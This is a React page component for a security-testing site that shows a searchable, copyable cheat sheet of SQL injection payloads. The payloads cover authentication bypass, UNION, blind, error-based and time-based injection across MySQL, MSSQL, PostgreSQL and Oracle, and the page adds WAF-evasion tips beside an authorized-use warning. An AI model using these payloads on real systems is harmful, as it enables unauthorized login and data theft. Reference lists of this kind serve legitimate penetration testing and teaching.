"use client"

import React, { useState } from 'react';
import { useDebounce } from '@/hooks/useDebounce';
import { Database, Copy, Check, ArrowLeft, Search, AlertTriangle, Info } from 'lucide-react';
import Link from 'next/link';

type Category = 'all' | 'auth-bypass' | 'union' | 'blind' | 'error' | 'time';
type DbType = 'mysql' | 'mssql' | 'postgresql' | 'oracle';

interface Payload {
    id: string;
    name: string;
    payload: string;
    description: string;
    category: Exclude<Category, 'all'>;
    databases: DbType[];
}

const payloads: Payload[] = [
    // Auth Bypass
    { id: '1', name: 'Basic OR Bypass', payload: "' OR '1'='1", description: 'Classic authentication bypass', category: 'auth-bypass', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '2', name: 'OR Bypass with Comment', payload: "' OR '1'='1'--", description: 'Bypass with SQL comment', category: 'auth-bypass', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '3', name: 'OR Bypass Hash Comment', payload: "' OR '1'='1'#", description: 'Bypass with hash comment (MySQL)', category: 'auth-bypass', databases: ['mysql'] },
    { id: '4', name: 'Admin Bypass', payload: "admin'--", description: 'Login as admin user', category: 'auth-bypass', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '5', name: 'Double Quote Bypass', payload: '" OR "1"="1', description: 'Double quote variant', category: 'auth-bypass', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '6', name: 'No Quote Bypass', payload: '1 OR 1=1', description: 'Numeric field bypass', category: 'auth-bypass', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    
    // UNION Based
    { id: '7', name: 'UNION Column Count', payload: "' UNION SELECT NULL--", description: 'Determine number of columns', category: 'union', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '8', name: 'UNION 2 Columns', payload: "' UNION SELECT NULL,NULL--", description: 'Two column UNION', category: 'union', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '9', name: 'UNION Version MySQL', payload: "' UNION SELECT @@version,NULL--", description: 'Get MySQL version', category: 'union', databases: ['mysql'] },
    { id: '10', name: 'UNION Version MSSQL', payload: "' UNION SELECT @@version,NULL--", description: 'Get MSSQL version', category: 'union', databases: ['mssql'] },
    { id: '11', name: 'UNION Version PostgreSQL', payload: "' UNION SELECT version(),NULL--", description: 'Get PostgreSQL version', category: 'union', databases: ['postgresql'] },
    { id: '12', name: 'UNION Tables MySQL', payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", description: 'List all tables', category: 'union', databases: ['mysql', 'mssql', 'postgresql'] },
    { id: '13', name: 'UNION Columns MySQL', payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", description: 'List columns from users table', category: 'union', databases: ['mysql', 'mssql', 'postgresql'] },
    
    // Blind SQL Injection
    { id: '14', name: 'Boolean Blind True', payload: "' AND 1=1--", description: 'Boolean-based blind (true condition)', category: 'blind', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '15', name: 'Boolean Blind False', payload: "' AND 1=2--", description: 'Boolean-based blind (false condition)', category: 'blind', databases: ['mysql', 'mssql', 'postgresql', 'oracle'] },
    { id: '16', name: 'Substring Check', payload: "' AND SUBSTRING(username,1,1)='a'--", description: 'Extract data character by character', category: 'blind', databases: ['mysql', 'mssql', 'postgresql'] },
    { id: '17', name: 'Length Check', payload: "' AND LENGTH(database())>5--", description: 'Check database name length', category: 'blind', databases: ['mysql', 'postgresql'] },
    
    // Error Based
    { id: '18', name: 'Error Extract MySQL', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--", description: 'Extract data via error message', category: 'error', databases: ['mysql'] },
    { id: '19', name: 'Error UPDATEXML', payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--", description: 'UPDATEXML error extraction', category: 'error', databases: ['mysql'] },
    { id: '20', name: 'Error MSSQL', payload: "' AND 1=CONVERT(int,(SELECT @@version))--", description: 'MSSQL conversion error', category: 'error', databases: ['mssql'] },
    
    // Time Based
    { id: '21', name: 'Time Delay MySQL', payload: "' AND SLEEP(5)--", description: '5 second delay if vulnerable', category: 'time', databases: ['mysql'] },
    { id: '22', name: 'Time Delay MSSQL', payload: "'; WAITFOR DELAY '0:0:5'--", description: '5 second delay for MSSQL', category: 'time', databases: ['mssql'] },
    { id: '23', name: 'Time Delay PostgreSQL', payload: "'; SELECT pg_sleep(5)--", description: '5 second delay for PostgreSQL', category: 'time', databases: ['postgresql'] },
    { id: '24', name: 'Conditional Time MySQL', payload: "' AND IF(1=1,SLEEP(5),0)--", description: 'Conditional time delay', category: 'time', databases: ['mysql'] },
];

const categoryLabels: Record<Category, string> = {
    'all': 'All Payloads',
    'auth-bypass': 'Auth Bypass',
    'union': 'UNION Based',
    'blind': 'Blind SQLi',
    'error': 'Error Based',
    'time': 'Time Based'
};

const dbLabels: Record<DbType, string> = {
    'mysql': 'MySQL',
    'mssql': 'MSSQL',
    'postgresql': 'PostgreSQL',
    'oracle': 'Oracle'
};

const dbColors: Record<DbType, string> = {
    'mysql': 'bg-blue-500/20 text-blue-400 border-blue-500/30',
    'mssql': 'bg-red-500/20 text-red-400 border-red-500/30',
    'postgresql': 'bg-cyan-500/20 text-cyan-400 border-cyan-500/30',
    'oracle': 'bg-orange-500/20 text-orange-400 border-orange-500/30'
};

const SQLInjectionPage = () => {
    const [searchQuery, setSearchQuery] = useState('');
    const debouncedSearch = useDebounce(searchQuery, 300);
    const [selectedCategory, setSelectedCategory] = useState<Category>('all');
    const [selectedDb, setSelectedDb] = useState<DbType | 'all'>('all');
    const [copiedId, setCopiedId] = useState<string | null>(null);

    const filteredPayloads = payloads.filter(p => {
        const matchesSearch = p.name.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            p.payload.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            p.description.toLowerCase().includes(debouncedSearch.toLowerCase());
        const matchesCategory = selectedCategory === 'all' || p.category === selectedCategory;
        const matchesDb = selectedDb === 'all' || p.databases.includes(selectedDb);
        return matchesSearch && matchesCategory && matchesDb;
    });

    const copyToClipboard = (id: string, text: string) => {
        navigator.clipboard.writeText(text);
        setCopiedId(id);
        setTimeout(() => setCopiedId(null), 2000);
    };

    return (
        <div className="min-h-screen pt-20">
            <div className="max-w-5xl mx-auto px-4 sm:px-6 py-12">
                {/* Header */}
                <div className="mb-8">
                    <Link 
                        href="/tools" 
                        className="inline-flex items-center gap-2 text-sm text-gray-500 hover:text-white mb-4 transition-colors"
                    >
                        <ArrowLeft className="w-4 h-4" />
                        Back to Tools
                    </Link>
                    <h1 className="text-2xl sm:text-3xl font-bold text-white mb-2">
                        SQL Injection Payloads
                    </h1>
                    <p className="text-gray-400">
                        Collection of SQL injection payloads for security testing.
                    </p>
                </div>

                {/* Warning */}
                <div className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/20">
                    <div className="flex items-start gap-3">
                        <AlertTriangle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
                        <div>
                            <p className="text-red-400 font-medium text-sm">Authorized Testing Only</p>
                            <p className="text-red-500/80 text-sm mt-1">
                                SQL injection attacks on systems without authorization is illegal. 
                                Only use these payloads on systems you own or have explicit permission to test.
                            </p>
                        </div>
                    </div>
                </div>

                {/* Quick Tips */}
                <div className="mb-8 p-4 rounded-xl bg-blue-500/10 border border-blue-500/20">
                    <div className="flex items-start gap-3">
                        <Info className="w-5 h-5 text-blue-500 mt-0.5 flex-shrink-0" />
                        <div>
                            <p className="text-blue-400 font-medium text-sm mb-2">Testing Tips</p>
                            <ul className="text-blue-500/80 text-sm space-y-1">
                                <li>• Try both single quotes (&apos;) and double quotes (&quot;)</li>
                                <li>• Use different comment styles: --, #, /* */</li>
                                <li>• Test with URL encoding: %27 for &apos;, %22 for &quot;</li>
                                <li>• Check for WAF bypass with case variations and whitespace</li>
                            </ul>
                        </div>
                    </div>
                </div>

                {/* Filters */}
                <div className="space-y-4 mb-6">
                    {/* Search */}
                    <div className="relative">
                        <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                        <input
                            type="text"
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            placeholder="Search payloads..."
                            className="w-full pl-11 pr-4 py-2.5 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-600 focus:border-orange-500/50 focus:outline-none transition-colors"
                        />
                    </div>

                    {/* Category Filter */}
                    <div className="flex flex-wrap gap-2">
                        {(Object.keys(categoryLabels) as Category[]).map((cat) => (
                            <button
                                key={cat}
                                onClick={() => setSelectedCategory(cat)}
                                className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-all ${
                                    selectedCategory === cat
                                        ? 'bg-orange-500 text-white'
                                        : 'bg-white/5 text-gray-400 hover:text-white border border-white/10'
                                }`}
                            >
                                {categoryLabels[cat]}
                            </button>
                        ))}
                    </div>

                    {/* Database Filter */}
                    <div className="flex flex-wrap gap-2">
                        <span className="text-sm text-gray-500 py-1.5">Database:</span>
                        <button
                            onClick={() => setSelectedDb('all')}
                            className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-all ${
                                selectedDb === 'all'
                                    ? 'bg-white/20 text-white'
                                    : 'bg-white/5 text-gray-400 hover:text-white border border-white/10'
                            }`}
                        >
                            All
                        </button>
                        {(Object.keys(dbLabels) as DbType[]).map((db) => (
                            <button
                                key={db}
                                onClick={() => setSelectedDb(db)}
                                className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-all border ${
                                    selectedDb === db
                                        ? dbColors[db]
                                        : 'bg-white/5 text-gray-400 hover:text-white border-white/10'
                                }`}
                            >
                                {dbLabels[db]}
                            </button>
                        ))}
                    </div>
                </div>

                {/* Payloads List */}
                <div className="space-y-3">
                    {filteredPayloads.map((p) => (
                        <div 
                            key={p.id}
                            className="p-4 rounded-xl border border-white/10 bg-white/[0.02] hover:border-white/20 transition-colors"
                        >
                            <div className="flex items-start justify-between gap-4">
                                <div className="flex-1 min-w-0">
                                    <div className="flex items-center gap-2 mb-1 flex-wrap">
                                        <h3 className="text-white font-medium text-sm">{p.name}</h3>
                                        <span className="px-2 py-0.5 text-xs rounded-full bg-white/5 text-gray-500 border border-white/10">
                                            {categoryLabels[p.category]}
                                        </span>
                                    </div>
                                    <p className="text-xs text-gray-500 mb-2">{p.description}</p>
                                    <div className="flex flex-wrap gap-1 mb-3">
                                        {p.databases.map((db) => (
                                            <span key={db} className={`px-2 py-0.5 text-xs rounded border ${dbColors[db]}`}>
                                                {dbLabels[db]}
                                            </span>
                                        ))}
                                    </div>
                                    <code className="block text-sm text-orange-400 bg-black/50 px-3 py-2 rounded-lg overflow-x-auto font-mono">
                                        {p.payload}
                                    </code>
                                </div>
                                <button
                                    onClick={() => copyToClipboard(p.id, p.payload)}
                                    className="p-2 rounded-lg border border-white/10 hover:border-white/20 text-gray-400 hover:text-white transition-colors flex-shrink-0"
                                >
                                    {copiedId === p.id ? (
                                        <Check className="w-4 h-4 text-green-500" />
                                    ) : (
                                        <Copy className="w-4 h-4" />
                                    )}
                                </button>
                            </div>
                        </div>
                    ))}
                </div>

                {filteredPayloads.length === 0 && (
                    <div className="text-center py-12">
                        <Database className="w-12 h-12 text-gray-600 mx-auto mb-4" />
                        <p className="text-gray-400">No payloads found</p>
                        <p className="text-sm text-gray-600">Try adjusting your search or filters</p>
                    </div>
                )}
            </div>
        </div>
    );
};

export default SQLInjectionPage;
